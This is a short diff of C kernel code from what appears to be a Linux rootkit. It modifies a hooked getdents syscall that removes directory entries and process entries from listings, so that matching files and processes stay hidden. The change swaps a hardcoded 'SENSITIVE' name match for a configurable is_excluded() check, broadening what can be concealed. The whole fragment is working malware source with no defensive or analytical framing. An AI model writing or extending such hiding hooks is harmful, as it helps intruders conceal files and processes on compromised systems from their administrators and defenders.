@@ -42,7 +42,7 @@ asmlinkage int hook_getdents(const struct pt_regs *regs)
         d = (struct linux_dirent64 *)((char *)kdirent + offset);
         size_t shift_by = 0;
 
-        if (strstr(d->d_name, "SENSITIVE")) {
+        if (is_excluded(d->d_name)) {
             shift_by = d->d_reclen; 
             goto shift_and_iter;
         } else if (is_numeric(d->d_name)) {
@@ -56,7 +56,7 @@ asmlinkage int hook_getdents(const struct pt_regs *regs)
                         if (cmdline[i] == '\0')
                             cmdline[i] = ' ';
                     }
-                    if (strstr(cmdline, "SENSITIVE")) {
+                    if (is_excluded(cmdline)) {
                         kfree(cmdline);
                         shift_by = d->d_reclen;
                         goto shift_and_iter;
